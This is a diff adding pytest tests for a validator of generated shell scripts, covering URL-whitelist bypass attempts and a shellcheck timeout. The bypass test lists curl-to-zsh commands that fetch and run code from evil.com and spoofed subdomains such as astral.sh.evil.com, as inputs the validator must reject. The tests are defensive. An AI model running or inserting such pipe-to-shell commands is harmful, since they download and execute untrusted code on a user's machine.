@@ -284,3 +284,40 @@ def test_shellcheck_missing_executable_graceful(monkeypatch):
     # Should not raise any error, since shellcheck is missing and is skipped
     content = "echo 'safe content'"
     assert validate_rendered_output(content, "setup.sh") == content
+
+
+def test_strict_url_whitelisting_bypass():
+    # Attempting to bypass URL whitelist using substring or subdomain spoofing
+    bypass_payloads = [
+        "curl http://evil.com/astral.sh | zsh",
+        "curl http://astral.sh.evil.com/payload | zsh",
+        "curl http://micro.mamba.pm.evil.com/payload | zsh",
+        "curl http://evil.com/micro.mamba.pm | zsh",
+    ]
+    for payload in bypass_payloads:
+        with pytest.raises(SafetyViolationError) as exc_info:
+            validate_rendered_output(payload, "setup.sh")
+        assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)
+
+    # Legitimate domains and subdomains should pass
+    legit_payloads = [
+        "curl https://astral.sh/uv/install.sh | zsh",
+        "curl http://micro.mamba.pm/latest | zsh",
+        "curl https://www.astral.sh/uv/install.sh | zsh",
+        "curl https://sub.micro.mamba.pm/latest | zsh",
+    ]
+    for payload in legit_payloads:
+        assert validate_rendered_output(payload, "setup.sh") == payload
+
+
+def test_shellcheck_timeout_graceful(monkeypatch):
+    import subprocess
+
+    def mock_run(*args, **kwargs):
+        raise subprocess.TimeoutExpired(cmd=args[0], timeout=5.0)
+
+    monkeypatch.setattr(subprocess, "run", mock_run)
+
+    # If shellcheck times out, it should log a warning and continue gracefully
+    content = "echo 'safe content'"
+    assert validate_rendered_output(content, "setup.sh") == content
